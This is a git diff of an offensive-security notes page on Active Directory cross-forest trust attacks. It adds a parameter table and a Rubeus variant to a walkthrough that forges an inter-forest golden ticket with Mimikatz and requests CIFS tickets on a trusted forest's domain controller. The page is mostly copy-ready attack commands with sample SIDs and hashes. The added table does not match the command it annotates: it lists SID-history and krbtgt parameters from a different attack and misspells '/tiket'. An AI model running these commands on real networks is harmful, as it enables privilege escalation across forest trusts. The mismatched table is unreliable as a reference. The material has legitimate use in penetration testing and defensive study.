@@ -1,12 +1,12 @@
 ---
-title: Across Forest Attacks
+title: Cross Forest Attacks
 category: Active Directory
 order: 6
 ---
 
 In this section we are going to abuse trusts between forests.
 
-# Across Forest using Trust Tickets
+# Across Forests using Trust Tickets
 
 First we need to retrieved the Trust Key:
 
@@ -20,12 +20,32 @@ An **inter-forest TGT** can be forged:
 ```powershell
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /rc4:cd3fb1b0b49c7a56d285fffdd1399231 /service:krbtgt /target:extcorp.local /ticket:C:\temp\trust_forest_tkt.kirbi"'
 ```
+* **Invoke-Mimikatz**
+
+|                   **Parameter**                   |                 **Description**                |
+|:-------------------------------------------------:|:----------------------------------------------:|
+| /domain:sub.corp.local                            | Current Domain FQDN                            |
+| /sid:S-1-5-21-268341927-4156873456-1784235843     | Current Domain SID                             |
+| /sids:S-1-5-21-280534878-1496970234-700767426-519 | SID of Enterprise Admins group (Parent Domain) |
+| /user:Administrator                               | User to impersonate                            |
+| /krbtgt:a9b30e5b0dc865eadcea9411e4ade72d          | krbtgt hash of Current Domain                  |
+| /tiket:C:\Windows\Temp\trust_tkt.kirbi            | File to store the ticket                       |
+
+
 
 Now we can request a TGS for `cifs` service on the dc of the trusted forest.
+
+* Asktgs.exe (kekeo_old)
 
 ```powershell
 .\asktgs.exe c:\temp\trust_forest_tkt.kirbi CIFS/dc01.extcorp.local
 ```
+
+* Rubeus.exe
+```powershell
+.\Rubeus.exe asktgs /ticket:trust_forest_tkt.kirbi /dc:dc01.extcorp.local /service:CIFS/dc01.extcorp.local
+```
+
 And inject the ticket on the current session:
 
 ```powershell
